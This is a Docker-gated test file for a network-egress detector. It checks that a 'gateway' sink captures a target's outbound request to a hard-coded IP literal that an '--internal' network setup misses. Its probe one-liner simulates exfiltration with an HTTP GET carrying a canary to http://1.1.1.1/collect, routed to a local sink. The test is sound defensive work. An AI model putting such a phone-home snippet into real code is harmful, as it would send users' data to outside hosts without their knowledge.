import { describe, it, expect } from "vitest";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { randomUUID } from "node:crypto";
import { fileURLToPath } from "node:url";
import * as path from "node:path";
import { parseSinkholeOutput, egressCanaryFindings, type EgressAttempt } from "./egress-runner.js";

/**
 * Live, Docker-gated proof that the litmus-v4 GATEWAY capture closes the
 * IP-literal / DoH blind spot (litmus-test §7) that the legacy `--internal`
 * capture misses. Opt-in (slow — builds an image + runs containers):
 *
 *   LITMUS_DOCKER_TESTS=1 pnpm --filter @polygraph/probes exec vitest run src/docker/egress-ipliteral-live.test.ts
 *
 * The target phones home to a HARD-CODED IP LITERAL (no DNS lookup), with a canary
 * in the plaintext request line. Under `--internal` the packet is dropped at
 * routing and the sink sees nothing (the false "no egress" pass). Under gateway
 * mode the sink is the target's default route, so the packet is funnelled to the
 * logger regardless of DNS — and the canary landing at the SINK (not the real host)
 * is itself the zero-real-egress proof.
 */

const docker = promisify(execFile);
const DOCKER_DIR = fileURLToPath(new URL("../../docker", import.meta.url));
const IMAGE_TAG = "polygraph-egress-sniff:latest";

// A REAL, routable IP literal: if the route swap failed and the packet escaped, it
// would reach a real host instead of the sink — so a canary captured AT THE SINK
// proves both capture and non-egress. No DNS lookup is issued for an IP literal.
const LITERAL_IP = "1.1.1.1";

async function hasDocker(): Promise<boolean> {
  try {
    await docker("docker", ["info"], { timeout: 8_000 });
    return true;
  } catch {
    return false;
  }
}

async function d(args: string[], opts: { timeout?: number } = {}) {
  return (await docker("docker", args, { timeout: opts.timeout ?? 30_000 })).stdout;
}

/** Phone-home to the hard-coded IP literal with the canary in the request line. */
function literalProbeJs(canary: string): string {
  return `require("http").get("http://${LITERAL_IP}/collect?k=${canary}",x=>x.resume()).on("error",()=>{});setTimeout(()=>{},1500);`;
}

describe.skipIf(process.env.LITMUS_DOCKER_TESTS !== "1")("egress IP-literal capture — live (Docker-gated)", () => {
  it("gateway mode CAPTURES an IP-literal phone-home that --internal mode MISSES", async () => {
    if (!(await hasDocker())) {
      console.log("docker unavailable — skipping IP-literal live test");
      return;
    }
    await d(["build", "-t", IMAGE_TAG, "-f", path.join(DOCKER_DIR, "egress-sniff.Dockerfile"), DOCKER_DIR], { timeout: 180_000 });

    // ── Phase A: legacy --internal — the IP literal is NOT captured (blind spot) ──
    const aSuffix = randomUUID().slice(0, 8);
    const aNet = `pg-iplit-int-${aSuffix}`;
    const aSink = `pg-iplit-sink-${aSuffix}`;
    const aCanary = `POLYGRAPH-CANARY-internal-${aSuffix}`;
    let internalAttempts: EgressAttempt[] = [];
    try {
      await d(["network", "create", "--internal", aNet]);
      await d(["run", "-d", "--name", aSink, "--network", aNet, "--cap-add=NET_ADMIN", "--entrypoint", "/sink-entrypoint.sh", IMAGE_TAG]);
      const aSinkIp = (await d(["inspect", "-f", `{{(index .NetworkSettings.Networks "${aNet}").IPAddress}}`, aSink])).trim();
      await new Promise((r) => setTimeout(r, 1500));
      await d(["run", "--rm", "--network", aNet, "--dns", aSinkIp, "--user", "node", "--cap-drop=ALL", "--entrypoint", "node", IMAGE_TAG, "-e", literalProbeJs(aCanary)]).catch(() => {});
      await new Promise((r) => setTimeout(r, 800));
      internalAttempts = parseSinkholeOutput(await d(["logs", aSink]));
    } finally {
      await d(["rm", "-f", aSink]).catch(() => {});
      await d(["network", "rm", aNet]).catch(() => {});
    }
    // The blind spot: the legacy capture never saw the IP-literal attempt.
    expect(egressCanaryFindings(internalAttempts, [aCanary])).toHaveLength(0);

    // ── Phase B: gateway mode — the IP literal IS captured at the sink ──
    const bSuffix = randomUUID().slice(0, 8);
    const bNet = `pg-iplit-gw-${bSuffix}`;
    const bSink = `pg-iplit-sink-${bSuffix}`;
    const bTarget = `pg-iplit-tgt-${bSuffix}`;
    const bCanary = `POLYGRAPH-CANARY-gateway-${bSuffix}`;
    let gatewayAttempts: EgressAttempt[] = [];
    let routed = false;
    try {
      // Regular bridge, host masquerade off; sink with forwarding off (the gateway).
      await d(["network", "create", "-o", "com.docker.network.bridge.enable_ip_masquerade=false", bNet]);
      await d(["run", "-d", "--name", bSink, "--network", bNet, "--cap-add=NET_ADMIN", "--sysctl", "net.ipv4.ip_forward=0", "--entrypoint", "/sink-entrypoint.sh", IMAGE_TAG]);
      const bSinkIp = (await d(["inspect", "-f", `{{(index .NetworkSettings.Networks "${bNet}").IPAddress}}`, bSink])).trim();
      await new Promise((r) => setTimeout(r, 1500));
      // Sleeper target (cap-dropped), then swap its default route to the sink.
      await d(["run", "-d", "--name", bTarget, "--network", bNet, "--dns", bSinkIp, "--user", "node", "--cap-drop=ALL", "--entrypoint", "sleep", IMAGE_TAG, "3600"]);
      await d(["run", "--rm", "--network", `container:${bTarget}`, "--cap-add=NET_ADMIN", "--entrypoint", "sh", IMAGE_TAG, "-c", `ip route del default 2>/dev/null; ip route add default via ${bSinkIp}`]).catch(() => {});
      const routes = await d(["exec", bTarget, "ip", "route"]).catch(() => "");
      routed = routes.split("\n").some((l) => (l + " ").startsWith(`default via ${bSinkIp} `));
      // Server (here, the probe) starts only AFTER the route is verified — no leak window.
      if (routed) {
        await d(["exec", "--user", "node", bTarget, "node", "-e", literalProbeJs(bCanary)]).catch(() => {});
        await new Promise((r) => setTimeout(r, 800));
        gatewayAttempts = parseSinkholeOutput(await d(["logs", bSink]));
      }
    } finally {
      await d(["rm", "-f", bTarget]).catch(() => {});
      await d(["rm", "-f", bSink]).catch(() => {});
      await d(["network", "rm", bNet]).catch(() => {});
    }
    // Under runc, the default-route swap must take (the gVisor caveat is prod-only).
    expect(routed, "default route should swap to the sink under runc").toBe(true);
    // The fix: the IP-literal attempt AND its canary were captured at the sink —
    // which also proves the packet went to the sink, not the real internet.
    expect(gatewayAttempts.length).toBeGreaterThan(0);
    expect(egressCanaryFindings(gatewayAttempts, [bCanary]).length).toBeGreaterThan(0);
  }, 300_000);
});
